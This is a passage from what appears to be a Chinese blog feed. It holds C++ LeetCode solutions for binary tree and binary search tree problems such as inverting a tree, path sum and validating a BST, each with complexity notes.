class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        queue&lt;TreeNode*&gt; left;<br>        queue&lt;TreeNode*&gt; right;<br>        <span class="hljs-keyword">if</span>(root-&gt;left)<br>            left.<span class="hljs-built_in">push</span>(root-&gt;left);<br>        <span class="hljs-keyword">if</span>(root-&gt;right)<br>            right.<span class="hljs-built_in">push</span>(root-&gt;right);<br>        TreeNode* p=root;<br>        TreeNode *l,*r;<br>        <span class="hljs-keyword">while</span>(!left.<span class="hljs-built_in">empty</span>()||!right.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-keyword">if</span>(left.<span class="hljs-built_in">size</span>()!=right.<span class="hljs-built_in">size</span>())<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            l=left.<span class="hljs-built_in">front</span>();<br>            left.<span class="hljs-built_in">pop</span>();<br>            r=right.<span class="hljs-built_in">front</span>();<br>            right.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span>(l-&gt;val!=r-&gt;val)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span>(l-&gt;left)<br>            &#123;<br>                left.<span class="hljs-built_in">push</span>(l-&gt;left);<br>                <span class="hljs-keyword">if</span>(r-&gt;right==<span class="hljs-literal">NULL</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(l-&gt;right)<br>            &#123;<br>                left.<span class="hljs-built_in">push</span>(l-&gt;right);<br>                <span class="hljs-keyword">if</span>(r-&gt;left==<span class="hljs-literal">NULL</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(r-&gt;right)<br>            &#123;<br>                right.<span class="hljs-built_in">push</span>(r-&gt;right);<br>                <span class="hljs-keyword">if</span>(l-&gt;left==<span class="hljs-literal">NULL</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(r-&gt;left)<br>            &#123;<br>                right.<span class="hljs-built_in">push</span>(r-&gt;left);<br>                <span class="hljs-keyword">if</span>(l-&gt;right==<span class="hljs-literal">NULL</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为节点个数</li><li>树，广度优先搜索，二叉树</li></ul><h2 id="第-12-天-树"><a href="#第-12-天-树" class="headerlink" title="第 12 天 树"></a>第 12 天 树</h2><h3 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a href="https://leetcode-cn.com/problems/invert-binary-tree/">226. 翻转二叉树</a></h3><p>给你一棵二叉树的根节点 <code>root</code> ，翻转这棵二叉树，并返回其根节点。</p><h4 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root)<br>            <span class="hljs-keyword">return</span> root;<br>        <span class="hljs-built_in">swap</span>(root-&gt;left,root-&gt;right);<br>        root-&gt;left=<span class="hljs-built_in">invertTree</span>(root-&gt;left);<br>        root-&gt;right=<span class="hljs-built_in">invertTree</span>(root-&gt;right);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为节点个数</li><li>树，二叉树，深度优先搜索</li></ul><h3 id="112-路径总和"><a href="#112-路径总和" class="headerlink" title="112. 路径总和"></a><a href="https://leetcode-cn.com/problems/path-sum/">112. 路径总和</a></h3><p>给你二叉树的根节点 root 和一个表示目标和的整数 targetSum 。判断该树中是否存在 根节点到叶子节点 的路径，这条路径上所有节点值相加等于目标和 targetSum 。如果存在，返回 true ；否则，返回 false 。</p><p>叶子节点 是指没有子节点的节点</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"> * Definition <span class="hljs-keyword">for</span> a binary tree node.<br> * <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> &#123;<br> *     <span class="hljs-type">int</span> val;<br> *     TreeNode *left;<br> *     TreeNode *right;<br> *     <span class="hljs-built_in">TreeNode</span>() : <span class="hljs-built_in">val</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">left</span>(<span class="hljs-literal">nullptr</span>), <span class="hljs-built_in">right</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;<br> *     <span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">left</span>(<span class="hljs-literal">nullptr</span>), <span class="hljs-built_in">right</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;<br> *     <span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> x, TreeNode *left, TreeNode *right) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">left</span>(left), <span class="hljs-built_in">right</span>(right) &#123;&#125;<br> * &#125;;<br> */<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasPathSum</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> targetSum)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-comment">//树是空的</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!root-&gt;left&amp;&amp;!root-&gt;right) <span class="hljs-comment">//叶节点</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(targetSum!=root-&gt;val)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>  <span class="hljs-comment">//其他节点</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">hasPathSum</span>(root-&gt;left,targetSum-root-&gt;val)||<span class="hljs-built_in">hasPathSum</span>(root-&gt;right,targetSum-root-&gt;val);<br>        &#125;     <br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>树，深度优先搜索，二叉树</li></ul><h2 id="第-13-天-树"><a href="#第-13-天-树" class="headerlink" title="第 13 天 树"></a>第 13 天 树</h2><h3 id="700-二叉搜索树中的搜索"><a href="#700-二叉搜索树中的搜索" class="headerlink" title="700. 二叉搜索树中的搜索"></a><a href="https://leetcode-cn.com/problems/search-in-a-binary-search-tree/">700. 二叉搜索树中的搜索</a></h3><p>给定二叉搜索树（BST）的根节点 root 和一个整数值 val。</p><p>你需要在 BST 中找到节点值等于 val 的节点。 返回以该节点为根的子树。 如果节点不存在，则返回 null 。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">searchBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root==<span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;val==val)<br>            <span class="hljs-keyword">return</span> root;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;val&lt;val)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">searchBST</span>(root-&gt;right,val);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">searchBST</span>(root-&gt;left,val);<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(logN)</li><li>树，二叉树，二叉搜索树</li></ul><h3 id="701-二叉搜索树中的插入操作"><a href="#701-二叉搜索树中的插入操作" class="headerlink" title="701. 二叉搜索树中的插入操作"></a><a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree/">701. 二叉搜索树中的插入操作</a></h3><p>给定二叉搜索树（BST）的根节点 root 和要插入树中的值 value ，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 输入数据 保证 ，新值和原始二叉搜索树中的任意节点值都不同。</p><p>注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回 任意有效的结果 。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">insertIntoBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        TreeNode *p=root;<br>        TreeNode *node=<span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(val); <br>        <span class="hljs-keyword">if</span>(root==<span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> node;<br>        <span class="hljs-keyword">while</span>(p)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(val&lt;p-&gt;val)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(p-&gt;left)<br>                    p=p-&gt;left;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    p-&gt;left=node;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">if</span>(p-&gt;right)<br>                    p=p-&gt;right;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    p-&gt;right=node;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                    <br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(logN)</li><li>树，二叉树，二叉搜索树</li><li>遍历法</li></ul><h2 id="第-14-天-树"><a href="#第-14-天-树" class="headerlink" title="第 14 天 树"></a>第 14 天 树</h2><h3 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode.cn/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></h3><p>给你一个二叉树的根节点 root ，判断其是否是一个有效的二叉搜索树。</p><p>有效 二叉搜索树定义如下：</p><p>节点的左子树只包含 小于 当前节点的数。<br>节点的右子树只包含 大于 当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-comment">//思路：BST树的中序遍历是升序的</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValidBST</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> lastVal=LONG_MIN; <span class="hljs-comment">//前驱节点的值(注意卡边界值的情况)</span><br>        stack&lt;TreeNode*&gt; data; <span class="hljs-comment">//待处理数据</span><br>        TreeNode* p=root;<br>        <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>||!data.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>) <span class="hljs-comment">//左链入栈</span><br>            &#123;<br>                data.<span class="hljs-built_in">push</span>(p);<br>                p=p-&gt;left;<br>            &#125;<br>            p=data.<span class="hljs-built_in">top</span>();<br>            data.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span>(p-&gt;val&lt;=lastVal)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">else</span><br>                lastVal=p-&gt;val;<br>            p=p-&gt;right;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$,n为结点数</li><li>树，二叉树，二叉搜索树，深度优先搜索</li></ul><h3 id="653-两数之和-IV-输入-BST"><a href="#653-两数之和-IV-输入-BST" class="headerlink" title="653. 两数之和 IV - 输入 BST"></a><a href="https://leetcode.cn/problems/two-sum-iv-input-is-a-bst/">653. 两数之和 IV - 输入 BST</a></h3><p>给定一个二叉搜索树 <code>root</code> 和一个目标结果 <code>k</code>，如果 BST 中存在两个元素且它们的和等于给定的目标结果，则返回 <code>true</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//中序遍历：升序</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">findTarget</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; ret;<br>        stack&lt;TreeNode*&gt; data; <span class="hljs-comment">//待处理数据</span><br>        TreeNode* p=root;<br>        <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>||!data.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>) <span class="hljs-comment">//左链入栈</span><br>            &#123;<br>                data.<span class="hljs-built_in">push</span>(p);<br>                p=p-&gt;left;<br>            &#125;<br>            p=data.<span class="hljs-built_in">top</span>();<br>            data.<span class="hljs-built_in">pop</span>();<br>            ret.<span class="hljs-built_in">push_back</span>(p-&gt;val);<br>            p=p-&gt;right;<br>        &#125;<br>        <span class="hljs-comment">// 双指针指向首、尾</span><br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=ret.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(ret[l]+ret[r]==k)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span>(ret[l]+ret[r]&lt;k)<br>                l++;<br>            <span class="hljs-keyword">else</span><br>                r--;    <br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$,n为结点数</li><li>树，二叉树，二叉搜索树，深度优先搜索，双指针</li></ul><h3 id="235-二叉搜索树的最近公共祖先"><a href="#235-二叉搜索树的最近公共祖先" class="headerlink" title="235. 二叉搜索树的最近公共祖先"></a><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先</a></h3><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p><p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;<br>        <span class="hljs-comment">//等于根</span><br>        <span class="hljs-keyword">if</span>(p-&gt;val==root-&gt;val||q-&gt;val==root-&gt;val)<br>            <span class="hljs-keyword">return</span> root;<br>        <span class="hljs-comment">//在根两边</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((p-&gt;val&lt;root-&gt;val)^(q-&gt;val&lt;root-&gt;val))<br>            <span class="hljs-keyword">return</span> root;<br>        <span class="hljs-comment">//在根左边</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p-&gt;val&lt;root-&gt;val)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);<br>        <span class="hljs-comment">//在根右边</span><br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>树，二叉树，二叉搜索树，深度优先搜索</li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Leetcode</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《数据库系统概论》课程之实验一：认识DBMS系统</title>
    <link href="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/"/>
    <url>/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/</url>
    
